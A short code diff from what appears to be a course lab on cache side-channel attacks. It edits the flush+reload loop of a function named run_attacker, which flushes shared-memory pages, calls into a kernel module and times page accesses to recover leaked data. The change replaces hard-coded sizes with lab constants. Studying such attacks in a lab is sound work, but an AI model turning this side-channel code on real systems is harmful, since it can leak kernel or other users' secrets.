@@ -61,18 +61,18 @@ int run_attacker(int kernel_fd, char *shared_memory) {
         // }
 
         // printf("Flush\n");
-        for (size_t j = 0; j < 256; j++) {
-            clflush((void *)(shared_memory + (j * 4096)));
+        for (size_t j = 0; j < LAB2_SHARED_MEMORY_NUM_PAGES; j++) {
+            clflush((void *)(shared_memory + (j * LAB2_PAGE_SIZE)));
         }
 
         // printf("Call\n");
         call_kernel_part1(kernel_fd, shared_memory, current_offset);
 
         // printf("Probe\n");
-        for (size_t k = 0; k < 128; k++) {
+        for (size_t k = 0; k < LAB2_SHARED_MEMORY_NUM_PAGES; k++) {
             int access_time;
 
-            access_time = time_access((void *)(shared_memory + (k * 4096)));
+            access_time = time_access((void *)(shared_memory + (k * LAB2_PAGE_SIZE)));
             // printf("access_time[%d]: %d\n", i, access_time);
 
             if (access_time < min_val) {
